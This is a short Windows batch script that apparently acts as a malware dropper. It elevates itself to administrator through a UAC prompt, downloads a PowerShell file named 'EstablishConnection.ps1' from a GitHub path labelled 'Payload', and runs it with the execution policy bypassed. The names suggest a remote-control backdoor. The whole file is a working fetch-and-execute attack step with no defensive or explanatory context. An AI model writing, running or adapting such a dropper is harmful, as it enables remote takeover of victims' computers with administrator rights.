@echo off
:: Check for admin privileges
>nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"

:: If not admin, restart script as admin
if %errorlevel% neq 0 (
    powershell -command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"
    exit /b
)

:: Continue running the script
if "%1"=="RunAs_Admin" (
    :: Run PowerShell as admin and execute your code
    powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d32a82143adcca323a8f82aa1bef1edab65af7da/Payload/EstablishConnection.ps1' -OutFile 'EstablishConnection.ps1'"
    PowerShell -ExecutionPolicy Bypass -File ".\EstablishConnection.ps1"
) else (
    echo Running script as administrator...
    powershell -command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"
)

:: Exit the script
exit /b